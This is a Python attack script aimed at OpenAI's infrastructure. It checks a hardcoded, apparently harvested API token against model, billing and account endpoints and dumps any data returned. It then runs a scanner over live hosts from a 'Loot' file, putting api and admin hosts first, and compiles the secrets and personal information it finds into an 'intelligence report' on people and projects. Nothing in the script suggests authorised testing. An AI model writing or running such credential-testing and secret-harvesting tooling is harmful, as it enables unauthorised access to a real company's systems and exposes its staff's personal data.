import json
import requests
import os
import sys

# Add modules to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))
from Oculus import Oculus

# Configuration
ALIVE_HOSTS_FILE = r"c:\Users\kille\Documents\trae_projects\osint_links\Intelligence_Database\OpenAI\Loot\hades_alive_endpoints.json"
TARGET_TOKEN = "eYjN4xNLgOM0w5re.CutMbyYAEjFyki.O2sTwhRwydecdmZ9"
OUTPUT_REPORT = r"c:\Users\kille\Documents\trae_projects\osint_links\Intelligence_Database\OpenAI\Reports\DEEP_DIVE_REPORT.md"

def validate_token(token):
    print(f"\n[!] VALIDATING TOKEN: {token}")
    
    endpoints = [
        "https://api.openai.com/v1/models",
        "https://api.openai.com/v1/engines",
        "https://api.openai.com/dashboard/billing/usage",
        "https://api.openai.com/v1/me"
    ]
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    results = []
    
    for url in endpoints:
        try:
            print(f"  Testing {url}...", end=" ")
            resp = requests.get(url, headers=headers, timeout=10)
            print(f"[{resp.status_code}]")
            
            if resp.status_code == 200:
                print(f"    [!!!] SUCCESS! Token works on {url}")
                results.append(f"SUCCESS: {url} (200 OK)")
                # Try to dump data
                try:
                    data = resp.json()
                    print(f"    Data Preview: {str(data)[:100]}...")
                    results.append(f"DATA: {str(data)}")
                except:
                    pass
            elif resp.status_code == 401:
                results.append(f"FAILED: {url} (401 Unauthorized)")
            elif resp.status_code == 403:
                results.append(f"BLOCKED: {url} (403 Forbidden)")
            else:
                results.append(f" weird: {url} ({resp.status_code})")
        except Exception as e:
            print(f"Error: {e}")
            results.append(f"ERROR: {url} - {e}")
            
    return results

def deep_scan_alive_hosts():
    print(f"\n[!] INITIATING DEEP SCAN OF ALIVE HOSTS")
    
    if not os.path.exists(ALIVE_HOSTS_FILE):
        print(f"Error: Alive hosts file not found at {ALIVE_HOSTS_FILE}")
        return
        
    with open(ALIVE_HOSTS_FILE, 'r') as f:
        hosts = json.load(f)
        
    print(f"Loaded {len(hosts)} alive hosts.")
    
    all_findings = {}
    
    # Hosts are strings in the JSON file
    priority_hosts = [h for h in hosts if 'api' in h or 'admin' in h or 'unified' in h]
    other_hosts = [h for h in hosts if h not in priority_hosts]
    
    scan_list = priority_hosts + other_hosts[:20] # Scan all priority + 20 others
    
    print(f"Scanning {len(scan_list)} high-value targets...")
    
    for url in scan_list:
        oculus = Oculus(url)
        findings = oculus.gaze()
        
        if findings:
            # Filter empty findings
            if any(findings.values()):
                all_findings[url] = findings
                
    return all_findings

def generate_report(token_results, scan_findings):
    with open(OUTPUT_REPORT, 'w', encoding='utf-8') as f:
        f.write("# DEEP DIVE INTELLIGENCE REPORT: OPENAI\n\n")
        
        f.write("## 1. TOKEN VALIDATION\n")
        f.write(f"Token Tested: `{TARGET_TOKEN}`\n\n")
        for res in token_results:
            f.write(f"- {res}\n")
            
        f.write("\n## 2. SURGICAL SCAN FINDINGS (PEOPLE & PROJECTS)\n")
        if not scan_findings:
            f.write("No significant secrets or personal info found in this pass.\n")
        else:
            for url, findings in scan_findings.items():
                has_content = False
                temp_buffer = f"\n### Target: {url}\n"
                
                for key, values in findings.items():
                    if values:
                        has_content = True
                        temp_buffer += f"- **{key.upper()}**:\n"
                        for v in set(values):
                            temp_buffer += f"  - `{v}`\n"
                            
                if has_content:
                    f.write(temp_buffer)
                    
    print(f"\n[+] Report generated at {OUTPUT_REPORT}")

if __name__ == "__main__":
    # 1. Validate Token
    token_results = validate_token(TARGET_TOKEN)
    
    # 2. Deep Scan
    scan_findings = deep_scan_alive_hosts()
    
    # 3. Report
    generate_report(token_results, scan_findings)
